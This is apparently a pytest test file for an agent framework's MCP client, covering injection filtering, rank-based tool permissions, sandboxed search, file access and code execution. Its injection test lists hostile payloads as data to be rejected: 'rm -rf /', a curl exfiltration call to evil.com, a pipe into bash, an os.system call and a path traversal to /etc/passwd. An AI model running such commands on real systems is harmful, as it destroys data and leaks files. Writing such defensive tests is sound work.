"""
Tests for MCP client, tool permissions, sandboxing, and injection filtering.
"""

import tempfile
import os
import pytest
from aztec_circle.adapters.mcp_client import MCPClient, check_injection
from aztec_circle.domain.exceptions import MCPInjectionRisk
from aztec_circle.domain.models import AgentRank


def test_injection_pattern_rejection():
    dangerous_payloads = [
        "; rm -rf /",
        "some_arg && curl http://evil.com/exfil",
        "echo test | bash",
        "__import__('os').system('ls')",
        "../../etc/passwd",
    ]
    for payload in dangerous_payloads:
        with pytest.raises(MCPInjectionRisk):
            check_injection(payload)


def test_benign_payload_passes():
    benign = '{"query": "distributed consensus algorithms", "path": "main.py"}'
    check_injection(benign)


def test_tool_permissions_per_rank():
    client = MCPClient()
    youth_tools = client.get_tool_schemas_for_rank(AgentRank.YOUTH)
    peer_tools = client.get_tool_schemas_for_rank(AgentRank.PEER)
    elder_tools = client.get_tool_schemas_for_rank(AgentRank.ELDER)

    youth_names = [t["function"]["name"] for t in youth_tools]
    peer_names = [t["function"]["name"] for t in peer_tools]
    elder_names = [t["function"]["name"] for t in elder_tools]

    assert "web_search" in youth_names
    assert "fs_read" in youth_names
    assert "code_exec" not in youth_names
    assert "fs_write" not in youth_names

    assert "code_exec" in peer_names
    assert "fs_write" in peer_names

    assert elder_names == ["fs_read"]


@pytest.mark.asyncio
async def test_mcp_execute_sandboxed_web_search():
    client = MCPClient()
    res = await client.execute_tool("web_search", {"query": "raft consensus"}, rank=AgentRank.YOUTH)
    assert res.tool_name == "web_search"
    assert "raft consensus" in res.result
    assert res.sandboxed is True


@pytest.mark.asyncio
async def test_mcp_execute_fs_read_and_write():
    client = MCPClient()
    with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
        f.write("Hello MCP World")
        temp_path = f.name

    try:
        read_res = await client.execute_tool("fs_read", {"path": temp_path}, rank=AgentRank.PEER)
        assert "Hello MCP World" in read_res.result

        write_res = await client.execute_tool("fs_write", {"path": temp_path, "content": "Updated"}, rank=AgentRank.PEER)
        assert "Updated" in write_res.result or "bytes" in write_res.result
    finally:
        if os.path.exists(temp_path):
            os.remove(temp_path)


@pytest.mark.asyncio
async def test_mcp_execute_code_exec():
    client = MCPClient()
    code_snippet = "print(10 + 20)"
    res = await client.execute_tool("code_exec", {"code": code_snippet}, rank=AgentRank.PEER)
    assert "30" in res.result.strip()


@pytest.mark.asyncio
async def test_mcp_discover_tools():
    client = MCPClient(uri="http://localhost:99999")  # Unreachable server falls back to defaults
    tools = await client.discover_tools()
    assert len(tools) >= 4
    assert any(t["name"] == "web_search" for t in tools)


@pytest.mark.asyncio
async def test_mcp_disallowed_tool_raises_permission_error():
    client = MCPClient()
    with pytest.raises(PermissionError):
        await client.execute_tool("code_exec", {"code": "print('hello')"}, rank=AgentRank.YOUTH)
